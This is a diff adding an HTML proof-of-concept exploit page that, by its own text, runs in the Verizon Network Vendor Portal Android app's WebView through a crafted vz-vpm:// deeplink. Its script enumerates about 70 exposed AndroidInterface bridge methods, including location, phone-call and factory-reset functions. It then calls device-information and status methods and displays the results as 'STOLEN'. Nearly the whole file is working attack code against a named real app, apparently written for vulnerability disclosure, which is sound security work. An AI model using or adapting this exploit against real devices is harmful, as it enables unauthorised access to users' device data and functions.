@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ATTACKER-CONTROLLED CONTENT</title>
+    <style>
+        body {
+            font-family: -apple-system, sans-serif;
+            margin: 20px;
+            background: #fff;
+            color: #333;
+        }
+        .banner {
+            background: #c00;
+            color: #fff;
+            padding: 12px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 18px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+        .result-box {
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 12px;
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 13px;
+            word-break: break-all;
+        }
+        .label {
+            font-weight: bold;
+            color: #c00;
+            margin-top: 15px;
+        }
+        .success { color: #0a0; font-weight: bold; }
+        .fail { color: #999; }
+    </style>
+</head>
+<body>
+    <div class="banner">ATTACKER-CONTROLLED CONTENT</div>
+    <p>This page is running inside the Verizon Network Vendor Portal app's WebView.</p>
+    <p>It was loaded via a crafted <code>vz-vpm://</code> deeplink that injected JavaScript.</p>
+
+    <div class="label">1. Bridge detection:</div>
+    <div class="result-box" id="bridge-check">Checking...</div>
+
+    <div class="label">2. Bridge method count:</div>
+    <div class="result-box" id="method-count">Checking...</div>
+
+    <div class="label">3. Available bridge methods:</div>
+    <div class="result-box" id="methods">Enumerating...</div>
+
+    <div class="label">4. Device information (via bridge):</div>
+    <div class="result-box" id="device-info">Calling AndroidInterface.getDeviceInformation()...</div>
+
+    <div class="label">5. Location enabled check (via bridge):</div>
+    <div class="result-box" id="location-check">Calling AndroidInterface.isLocationEnabled()...</div>
+
+    <div class="label">6. WiFi connected check (via bridge):</div>
+    <div class="result-box" id="wifi-check">Calling AndroidInterface.isWifiConnected()...</div>
+
+    <div class="label">7. App version (via bridge):</div>
+    <div class="result-box" id="app-version">Calling AndroidInterface.getAppShellVersion()...</div>
+
+    <script>
+    (function() {
+        var results = {};
+
+        // 1. Check if bridge exists
+        var bridgeEl = document.getElementById('bridge-check');
+        if (typeof window.AndroidInterface !== 'undefined') {
+            bridgeEl.innerHTML = '<span class="success">AndroidInterface = ' + typeof window.AndroidInterface + ' (BRIDGE IS ACCESSIBLE)</span>';
+        } else {
+            bridgeEl.innerHTML = '<span class="fail">AndroidInterface not found</span>';
+            return;
+        }
+
+        // 2. Count methods
+        var methods = [];
+        try {
+            for (var key in window.AndroidInterface) {
+                if (typeof window.AndroidInterface[key] === 'function') {
+                    methods.push(key);
+                }
+            }
+        } catch(e) {}
+
+        // Also check known methods directly
+        var knownMethods = [
+            'addWifiExtender','canPairWithRepeater','checkFOTAUpdates',
+            'connectToDevice','connectToNoke','connectToRepeater',
+            'disconnectBleDevice','disconnectBluetooth','fileView',
+            'generateReleaseCertificate','getActivationStatus','getAndroidLogs',
+            'getAndroidVersion','getAppShellVersion','getDeviceInformation',
+            'getExtenderStatusInfo','getGeminiWifiInfo','getInternetStatus',
+            'getIsLocationEnabled','getLatitude','getLocation','getLongitude',
+            'getPairedDevices','getReceiverInstallationMode','getRouterMode',
+            'getWifiStrength','isLocationEnabled','isWifiConnected',
+            'launchHardwareManuals','launchHomePhoneManual','launchRemoteAssist',
+            'launchStore','pollSpeedtest','pushNotification','readRepeaterInfo',
+            'scanBarCode','scanNodeSerialNumber','scanQrCode','scanQrCode_new',
+            'sendNokeCommand','setBLEPIN','setFOTAOperation',
+            'setPowerFactoryResetOperation','setReceiverInstallationMode',
+            'setRouterMode','setScreenshotFlag','showAndroidVersion','showToast',
+            'showWifiSettings','startBleScanning','startBluetoothService',
+            'startLocation','startLocationUpdates','startNavigation',
+            'startNavigationWithAddress','startNokeScanning','startNokeService',
+            'startPhoneCall','startReadingSignal','startRepeaterInfo',
+            'startSpeedTest','stopLocationUpdates','stopNokeScanning',
+            'stopNokeService','stopReadingSignal','stopRepeaterInfo',
+            'toggleRepeaterInstallationMode','unpairRepeater','updateApp',
+            'updateLocationSetting','updateWifiDetails','viewPDFOverHTTP'
+        ];
+        var accessible = [];
+        for (var i = 0; i < knownMethods.length; i++) {
+            try {
+                if (typeof window.AndroidInterface[knownMethods[i]] === 'function') {
+                    accessible.push(knownMethods[i]);
+                }
+            } catch(e) {}
+        }
+
+        document.getElementById('method-count').innerHTML =
+            '<span class="success">' + accessible.length + ' bridge methods accessible to attacker JavaScript</span>';
+
+        document.getElementById('methods').innerHTML = accessible.join(', ');
+
+        // 3. Call safe read-only bridge methods as proof
+        try {
+            var devInfo = window.AndroidInterface.getDeviceInformation();
+            document.getElementById('device-info').innerHTML =
+                '<span class="success">STOLEN: ' + devInfo + '</span>';
+        } catch(e) {
+            document.getElementById('device-info').innerHTML = 'Error: ' + e.message;
+        }
+
+        try {
+            var locEnabled = window.AndroidInterface.isLocationEnabled();
+            document.getElementById('location-check').innerHTML =
+                '<span class="success">Location enabled: ' + locEnabled + '</span>';
+        } catch(e) {
+            document.getElementById('location-check').innerHTML = 'Error: ' + e.message;
+        }
+
+        try {
+            var wifi = window.AndroidInterface.isWifiConnected();
+            document.getElementById('wifi-check').innerHTML =
+                '<span class="success">WiFi connected: ' + wifi + '</span>';
+        } catch(e) {
+            document.getElementById('wifi-check').innerHTML = 'Error: ' + e.message;
+        }
+
+        try {
+            var appVer = window.AndroidInterface.getAppShellVersion();
+            document.getElementById('app-version').innerHTML =
+                '<span class="success">App version: ' + appVer + '</span>';
+        } catch(e) {
+            document.getElementById('app-version').innerHTML = 'Error: ' + e.message;
+        }
+    })();
+    </script>
+</body>
+</html>
+
